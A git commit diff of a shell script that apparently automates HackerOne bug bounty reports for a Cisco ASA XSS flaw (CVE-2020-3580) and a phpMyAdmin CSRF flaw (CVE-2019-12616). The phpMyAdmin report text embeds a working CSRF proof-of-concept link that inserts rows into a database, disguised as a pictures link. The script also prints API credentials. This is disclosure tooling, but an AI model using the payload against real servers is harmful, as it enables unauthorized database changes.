81ef657b8634901927ac262358733d1589be1a79
Deleite <pdelteil@gmail.com>
2021-07-30 00:11:05 +0000

    small updates

--- createReports.sh
+++ createReports.sh
@@ -2,7 +2,7 @@
 #using export username and apikey
 
 #load credentials and other params
-. ./config.txt
+. ./config.local.txt
 
 if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]
     then
@@ -27,13 +27,14 @@ apiEndpoint="https://api.hackerone.com/v1/hackers/reports"
 # creates a report for CVE-2020-3580
 if [ "$bug" == "CVE-2020-3580" ]
 then
+    #check config file for details
     #name of the resulting POC file
     file="post-xss-$domain.html"
     URL="$reportsURL/$file"
     echo "POC URL: " $URL
 
     #replace the url from template to new POC
-    sed "s/DOMAIN/$domain/g" $postXSStemplate > $file
+    sed "s/DOMAIN/$domain/g" $postXSStemplate > $webPath"/"$file
 
     title='XSS due to CVE-2020-3580 ['$domain']'
     bodySummary="Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. \n\n "
@@ -53,7 +54,7 @@ then
     #specific phpmyin version to be added to the report
     version="$5"
     title='PhpMyAdmin instance vulnerable to CVE-2019-12616 ['$domain']'    
-    bodySummary="An issue was discovered in phpMyAdmin before 4.9.0. A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) to the victim.\n\n Installed version $version  which is vulnerable (phpMyAdmin <= 4.9.0)\n Version number can be checked here https://"$domain"/phpmyadmin/doc/html/index.html\n\n"
+    bodySummary="An issue was discovered in phpMyAdmin before 4.9.0. A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) to the victim.\n\n Installed version $version  which is vulnerable (phpMyAdmin <= 4.9.0)\n Version number can be checked here https://"$domain"/phpmyadmin/Documentation.html\n\n"
     bodyStepsToRep="PhpMyAdmin endpoint  \n - https://"$domain"/phpmyadmin/\n\nCreate a HTML file with the following content\n\n<html>\n<head>\n<title>POC CVE-2019-12616</title>\n</head>\n<body>\n<a href='https://"$domain"/phpmyadmin/tbl_sql.php?sql_query=INSERT+INTO+\`pma__bookmark\`+(\`id\`%2C+\`dbase\`%2C+\`user\`%2C+\`label\`%2C+\`query\`)+VALUES+(DAYOFWEEK('')%2C+''%2C+''%2C+''%2C+'')&show_query=1&db=phpmyadmin&table=pma__bookmark'>View my Pictures!</a>\n</body>\n</html>\n\nAn attacker can create a page using the above HTML code, trick the victim into clicking the URL and performing Insert/Delete actions to the database. "
     body="$bodySummary$bodyStepsToRep"
     impact="An attacker can perform arbitrary actions on behalf of the victim, such as execute arbitrary INSERT or DELETE statements, delete an arbitrary server on the Setup page. \n\n Supporting Material/References \n* https://nvd.nist.gov/vuln/detail/CVE-2019-12616\n* **Exploit** https://www.exploit-db.com/exploits/46982"
@@ -101,6 +102,7 @@ then
     echo "$reportsURL"
     echo "Credentials: "$usernameTesting:$apikeyTesting
     echo "Credentials: "$usernameProduction:$apikeyProduction
+    exit
 fi
 #production mode
 if [ "$mode" == "-p" ]
